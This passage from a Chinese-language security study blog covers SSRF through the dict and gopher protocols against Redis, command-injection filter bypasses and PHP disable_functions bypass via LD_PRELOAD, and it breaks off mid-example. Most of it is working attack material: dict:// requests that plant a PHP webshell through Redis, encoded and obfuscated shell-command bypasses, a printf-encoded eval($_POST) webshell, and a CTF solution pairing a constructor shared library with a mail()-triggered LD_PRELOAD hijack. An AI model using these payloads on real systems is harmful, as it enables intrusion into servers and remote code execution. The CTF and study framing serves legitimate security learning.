<li><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></li>
</ol>
<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>通过dict协议像redis写数据</p>
<p>curl.php:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&#x27;url&#x27;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>过程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#刷新</span><br><span class="line">/curl.php?url=dict://127.0.0.1:6379/flushall</span><br><span class="line">#设置redis的根目录</span><br><span class="line">/curl.php?url=dict://127.0.0.1:6379/config:set:dir:/var/www/html/redis</span><br><span class="line">#设置一会写webshell的名字是a1batr0ss.php</span><br><span class="line">/curl.php?url=dict://127.0.0.1:6379/config:set:dbfilename:a1batr0ss.php</span><br><span class="line">#往/var/www/html/redis/a1batr0ss.php里面写入phpinfo【会过滤一些关键字符所以要用16进制绕过】</span><br><span class="line">/curl.php?url=dict://127.0.0.1:6379/set:webshell:&quot;\x3C\x3fphp\x20phpinfo\x28\x29\x3b\x3f\x3e&quot;</span><br><span class="line">#一定最后记得保存，不然可能不生效！！！</span><br><span class="line">/curl.php?url=dict://127.0.0.1:6379/save</span><br><span class="line"></span><br><span class="line">#查看现在的webshell</span><br><span class="line">/curl.php?url=dict://127.0.0.1:6379/get:webshell</span><br></pre></td></tr></table></figure>





<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><h3 id="gopher打redis"><a href="#gopher打redis" class="headerlink" title="gopher打redis"></a>gopher打redis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#开启redis服务器</span><br><span class="line">redis-server</span><br><span class="line">#带配置文件开启redis服务器</span><br><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line">#连接redis</span><br><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line">#抓取redis流量数据包</span><br><span class="line">tcpdump -i lo port 6379 -w gopher.pcap</span><br></pre></td></tr></table></figure>

<p>在redis-cli里面输入<code>set hack a1batr0ss</code>，抓取流量包跟踪tcp流</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210820132205421.png" alt="image-20210820132205421"></p>
<p>将框框里的东西提取出来前面加上百分号：gopher.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str1 = &quot;2a 33 0d 0a 24 33 0d 0a 73 65 74 0d 0a 24 34 0d 0a 68 61 63 6b 0d 0a 24 39 0d 0a 61 31 62 61 74 72 30 73 73 0d 0a&quot;</span><br><span class="line">list1 = str1.split(&quot; &quot;)</span><br><span class="line">str2 = &quot;%&quot;.join(list1)</span><br><span class="line">print(&quot;%&quot;+str2)	</span><br></pre></td></tr></table></figure>

<p>然后</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210820132338606.png" alt="image-20210820132338606"></p>
<p>此时</p>
<p><code>get hack</code>值就变成了<code>a1batr0ss</code></p>
<p>写shell也是一样，抓取这些数据加上百分号即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/redis</span><br><span class="line">config set dbfilename goShell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save	//save不能少！！！</span><br></pre></td></tr></table></figure>

<p>hackbar里也是只要一次编码就行了</p>
<p>假如在burp用curl，在web端要记得双编码【也就是把%全变成%25，其他不变】：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201205124631-d84bc6e2-36b4-1.png" alt="img"></p>
<p>如果说需要认证的redis</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20211019213301586.png" alt="image-20211019213301586"></p>
<h3 id="gopher传POST数据"><a href="#gopher传POST数据" class="headerlink" title="gopher传POST数据"></a>gopher传POST数据</h3><p>我们可以先写一个php页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">echo &quot;Hello  &quot; . $name . &quot;&lt;br/&gt;&quot;;</span><br></pre></td></tr></table></figure>



<p>构造一个POST请求的gopher至少需要这些数据【content-length要改】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /test/ssrf.php HTTP/1.1</span><br><span class="line">Host: 192.168.33.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"> </span><br><span class="line">name=ag</span><br></pre></td></tr></table></figure>

<p>然后用脚本加密一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">test =\</span><br><span class="line">&quot;&quot;&quot;POST /test/ssrf.php HTTP/1.1</span><br><span class="line">Host: 192.168.33.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">name=ag</span><br><span class="line">&quot;&quot;&quot;  </span><br><span class="line">#注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="line">result = &#x27;_&#x27;+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>构造成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.33.1:80/_POST%20/test/ssrf.php%20HTTP/1.1%0D%0AHost%3A%20192.168.33.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%207%0D%0A%0D%0Aname%3Dag%0D%0A</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20211109222715860.png" alt="image-20211109222715860"></p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="命令执行的绕过"><a href="#命令执行的绕过" class="headerlink" title="命令执行的绕过"></a>命令执行的绕过</h2><h3 id="代码执行漏洞和命令执行漏洞"><a href="#代码执行漏洞和命令执行漏洞" class="headerlink" title="代码执行漏洞和命令执行漏洞"></a>代码执行漏洞和命令执行漏洞</h3><h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><p>类似eval(),assert()函数，比如在php中执行php的代码【phpinfo();，echo “123”】</p>
<h4 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h4><p>类似exec(),system()，相当于执行系统命令【ls，whoami】</p>
<h4 id="一些url编码"><a href="#一些url编码" class="headerlink" title="一些url编码"></a>一些url编码</h4><p><strong>常用url编码</strong> ：</p>
<blockquote>
<p>%20 &#x3D; 空格<br>%5c &#x3D; <br>%26 &#x3D; &amp;<br>%7c &#x3D; |<br>%0a&#x3D;换行<br>%3b&#x3D;;</p>
</blockquote>
<img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1.png" alt="1" style="zoom: 67%;">





<h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul>
<li><p><strong>command1 &amp; command2 ：</strong></p>
<p>不管command1执行成功与否，都会执行command2</p>
</li>
<li><p><strong>command1 &amp;&amp; command2 ：</strong></p>
<p>先执行command1执行成功后才会执行command2</p>
</li>
<li><p><strong>command1 | command2 ：</strong></p>
<p>将上一个命令的输出作为下一个命令的输入</p>
</li>
<li><p><strong>command1 || command2 ：</strong></p>
<p>command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</p>
</li>
</ul>
<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><ul>
<li><p>;   前面的执行完执行后面的    </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1;whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>|   将上一个命令的输出作为下一个命令的输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1|whoami       </span><br></pre></td></tr></table></figure>
</li>
<li><p>||  当前面的执行出错时执行后面的  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 1||whoami  </span><br></pre></td></tr></table></figure>
</li>
<li><p>&amp;  前面的语句为假则直接执行后面的,前面可真可假           </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1&amp;whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真   </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="几种bypass"><a href="#几种bypass" class="headerlink" title="几种bypass"></a>几种bypass</h3><h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><p>有时有些内容无法回显,我们可以base64编码它们</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;cat xxx.txt | base64</span><br></pre></td></tr></table></figure>

<p>&amp;的作用是把前面输出的结果作为输入进行后面的操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;base64 xxx.txt</span><br></pre></td></tr></table></figure>



<h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><p>反斜杠 ： 例如 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t fl\ag.php</span><br></pre></td></tr></table></figure>

<p>连接符： 例如  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca&#x27;&#x27;t fla&#x27;&#x27;g.txt</span><br></pre></td></tr></table></figure>



<p>如果系统中没有cat’命令</p>
<ol>
<li>tac</li>
<li>&#x2F;bin&#x2F;cat</li>
</ol>
<h4 id="过滤空格【windows不适用】"><a href="#过滤空格【windows不适用】" class="headerlink" title="过滤空格【windows不适用】"></a>过滤空格【windows不适用】</h4><p>在 bash 下, 可以用以下字符代替空格：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, $&#123;IFS&#125;,$IFS 等</span><br></pre></td></tr></table></figure>



<h4 id="换行bypass"><a href="#换行bypass" class="headerlink" title="换行bypass"></a>换行bypass</h4><p>preg_replace只能匹配第一行的内容，所以我们可以用<code>%0a</code>来让我们的主体内容放入第二行，从而绕过过滤。</p>
<h4 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h4><p>{cat,flag} 逗号代替空格</p>
<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><p>拼接绕过:相当于ls</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=l;$b=s;$a$b</span><br></pre></td></tr></table></figure>

<p>编码绕过：</p>
<p><strong>base64：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo MTIzCg==|base64 -d 其将会打印123</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure>

<p><strong>hex:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure>

<p><strong>oct：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(printf &quot;\154\163&quot;) ==&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span><br><span class="line">&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>



<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>长度限制可以用文件构造的方式来绕过。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux下可以用 1&gt;a创建文件名为a的空文件</span><br><span class="line"><span class="built_in">ls</span> -t&gt;<span class="built_in">test</span>则会将目录按时间排序后写进<span class="built_in">test</span>文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>



<h4 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h4><p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。类似的还有$(command).</p>
<blockquote>
<p><code>cat$IFS(反引)ls(反引)</code>    &#x2F;&#x2F;带反引号</p>
</blockquote>
<blockquote>
<p><code>cat$IFS$(ls)</code></p>
</blockquote>
<p>相当于先ls列出目录下的所有文件，再把这些文件都cat出来</p>
<h4 id="过滤分割符-amp-；"><a href="#过滤分割符-amp-；" class="headerlink" title="过滤分割符 | &amp; ；"></a>过滤分割符 | &amp; ；</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;  //分号</span><br><span class="line">|  //只执行后面那条命令</span><br><span class="line">||  //只执行前面那条命令</span><br><span class="line">&amp;  //两条命令都会执行</span><br><span class="line">&amp;&amp;  //两条命令都会执行</span><br><span class="line">%0a      //换行符</span><br><span class="line">%0d     //回车符号</span><br><span class="line"></span><br><span class="line">用?&gt;代替；</span><br><span class="line">在php中可以用?&gt;来代替最后的一个；，因为php遇到定界符关闭标签会自动在末尾加上一个分号。</span><br></pre></td></tr></table></figure>





















































<h2 id="绕过disable-function"><a href="#绕过disable-function" class="headerlink" title="绕过disable_function"></a>绕过disable_function</h2><blockquote>
<p>通常来说，导致 webshell 不能执行命令的原因大概有三类：</p>
<ul>
<li>一是 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；</li>
<li>二是 web 进程运行在 rbash 这类受限 shell 环境中；</li>
<li>三是 WAF 拦劫。</li>
</ul>
</blockquote>
<p>严苛环境下php设置的disable_function如下：</p>
<ul>
<li>dl</li>
<li>exec</li>
<li>system</li>
<li>passthru</li>
<li>popen</li>
<li>proc_open</li>
<li>pcntl_exec</li>
<li>shell_exec</li>
</ul>
<p>如果你遇到的设置中漏掉某些函数，那再好不过了，直接利用<strong>漏掉的函数</strong>绕过。但如果运气不太好，遇到这种所有能直接执行系统命令的函数都被禁用的情况，那真是欲哭无泪。想反弹一个cmdshell变成奢望。当然考虑到开发使用等影响因素，一般web环境不应完全禁用。</p>
<p>笔者经过大量资料搜寻，发现在这种情况下还有几种执行系统命令的方法，例如<strong>通过&#x2F;proc&#x2F;self&#x2F;mem 修改got来劫持库函数调用</strong>以及<strong>php反序列化内存破坏漏洞利用</strong>，但这些方法利用起来难度都较大，你得先搞清楚内存偏移地址等等知识点，并搭建相同的平台进行调试。而且一般来说安全配置还会严格限制用户的文件权限并设置open_basedir，你根本没有机会去读取mem等文件，很难利用成功。</p>
<p>那么还有没有别的方法？<strong>putenv和mail</strong>函数给了我们希望，如果系统<strong>没有修补bash漏洞</strong>，利用网上已经给出的poc：<a target="_blank" rel="noopener" href="http://www.exploit-db.com/exploits/35146/">http://www.exploit-db.com/exploits/35146/</a> 可以轻松绕过。</p>
<p>这个poc大体思路是通过putenv来设置一个包含自定义函数的环境变量，通过mail函数来触发。为什么mail函数能触发，因为<strong>mail函数在执行过程中，php与系统命令执行函数有了交集</strong>，它调用了popen函数来执行，如果系统有bash漏洞，就直接触发了恶意代码的执行。但一般这种漏洞，安全意识好一点的运维，都会给打上补丁了。</p>
<p>那么我们来继续挖掘一下它的思路，php的mail函数在执行过程中会默认调用系统程序&#x2F;usr&#x2F;sbin&#x2F;sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的了。那么我们有没有办法在webshell层来劫持它呢，环境变量<strong>LD_PRELOAD</strong>给我们提供了一种简单实用的途径。</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h4><p>先利用取反绕过过滤限制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;include(&quot;/tmp/b.php&quot;);&#x27;</span>;</span><br><span class="line"><span class="comment">//$b = &#x27;phpinfo()&#x27;;</span></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>连上蚁剑之后先传一个hack.so【这玩意必须要在debian上编译，win10上实测不行！！！】</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/readflag &gt; /tmp/op.txt 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后上传ag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;Hacked BY AG&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/tmp/hack2.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问ag.php即可获得flag</p>
<h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><ol>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/109078117">CTFHub Bypass disable_function系列（已完结）_feng的博客-CSDN博客</a>【好文章！！！】</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions">AntSword-Labs&#x2F;bypass_disable_functions at master · AntSwordProject&#x2F;AntSword-Labs · GitHub</a></p>
</li>
</ol>
<h3 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a>一些知识点</h3><h4 id="fork-x2F-exec机制"><a href="#fork-x2F-exec机制" class="headerlink" title="fork&#x2F;exec机制"></a>fork&#x2F;exec机制</h4><h4 id="cgi"><a href="#cgi" class="headerlink" title="cgi"></a>cgi</h4><p><a target="_blank" rel="noopener" href="http://icodeit.org/2014/04/how-web-works-cgi/">Web是怎么工作的: CGI脚本 - I code it</a></p>
<p>关于一些特殊权限</p>
<img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210702151518553.png" alt="image-20210702151518553" style="zoom:50%;">

<p>SUID：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod o+s /tmp或</span><br><span class="line">chmod 4777 /tmp</span><br></pre></td></tr></table></figure>

<p>SGID</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod g+s /tmp或</span><br><span class="line">chmod 2777 /tmp</span><br></pre></td></tr></table></figure>

<p>SBIT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod o+t /tmp或者</span><br><span class="line">chmod 1777 /tmp</span><br></pre></td></tr></table></figure>





<h3 id="切换shell"><a href="#切换shell" class="headerlink" title="切换shell"></a>切换shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/ksh</span><br><span class="line">usermod -s /bin/ksh root</span><br></pre></td></tr></table></figure>







<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><h4 id="参考文章-2"><a href="#参考文章-2" class="headerlink" title="参考文章"></a>参考文章</h4><ol>
<li><a target="_blank" rel="noopener" href="https://codechina.csdn.net/mirrors/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?utm_source=csdn_github_accelerator">mirrors &#x2F; yangyangwithgnu &#x2F; bypass_disablefunc_via_LD_PRELOAD · CODE CHINA (csdn.net)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions - FreeBuf网络安全行业门户</a></li>
</ol>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li>目标服务器是Linux操作系统【例子四的劫持】</li>
</ol>
<h4 id="例子一【基本调用参考】"><a href="#例子一【基本调用参考】" class="headerlink" title="例子一【基本调用参考】"></a>例子一【基本调用参考】</h4><p>我们先来看看这个参数的作用：</p>
<p>先创建一个verifyPass.c文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 这是一段判断用户口令的程序，其中使用到了标准C函数strcmp*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> passwd[] = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;password&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Correct Password!\n&quot;</span>);        </span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Invalid Password!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀AGsite)-[~/from_now_on/rce/LD_PRELOAD]</span><br><span class="line">└─# gcc verifyPass.c -o verifyPass</span><br><span class="line"></span><br><span class="line">┌──(root💀AGsite)-[~/from_now_on/rce/LD_PRELOAD]</span><br><span class="line">└─# ./verifyPass 123                                                                                          Invalid Password!</span><br><span class="line"></span><br><span class="line">┌──(root💀AGsite)-[~/from_now_on/rce/LD_PRELOAD]</span><br><span class="line">└─# ./verifyPass password</span><br><span class="line">Correct Password!</span><br></pre></td></tr></table></figure>

<p>这时假如我们新建一个strcmp.c</p>
